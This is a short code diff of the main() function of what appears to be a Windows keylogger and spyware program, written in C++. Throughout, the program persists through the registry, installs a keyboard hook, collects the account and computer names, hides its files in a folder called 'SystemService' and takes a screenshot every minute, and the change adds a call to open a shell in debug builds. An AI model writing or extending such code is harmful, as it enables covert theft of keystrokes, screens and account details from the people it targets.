@@ -10,8 +10,7 @@
 
 int main() {
 #ifdef DEBUG_BUILD
-  std::cout << "In debug mode!\n";
-  return 0;
+  Sys::CreateShell();
 #endif
 
 #ifndef DEBUG_BUILD
@@ -24,13 +23,12 @@ int main() {
 
   Sys::AddToRegistry();
   KeyHook::InstallHook();
-
   Stream::GetAccountInfo(clientInfo);
 
   std::string path = Stream::GetPath("\\Microsoft\\");
-
   BDirectory mainDir;
   Stream::LogFile logFile;
+
   mainDir.name = "SystemService";
   mainDir.path = Stream::GetPath(Stream::GetPath("\\" + mainDir.name));
 
@@ -44,17 +42,17 @@ int main() {
 
   DWORD major = clientInfo.osVersionInfo.dwMajorVersion;
   DWORD minor = clientInfo.osVersionInfo.dwMinorVersion;
-  char *account_name = clientInfo.accountName;
+  char *accountName = clientInfo.accountName;
   char *com = clientInfo.computerName;
 
   ostream << "\n[*] OS Info: Major - " << major << "; Minor - " << minor << " [*]"
-		  << "\n[*] Account Info: User -" << account_name << "; Computer - " << com << " [*]";
+		  << "\n[*] Account Info: User -" << accountName << "; Computer - " << com << " [*]";
 
-  free(account_name);
-  free(com);
+  delete accountName;
+  delete com;
 
   std::string write = ostream.str();
-  Stream::WriteLog(write, KeyHook::activeProcess, false);
+  Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
   Screen::CaptureScreen(mainDir.path + "\\", "winpst", true, 60000); // Screenshot
 
   KeyHook::HandleMessage(true);
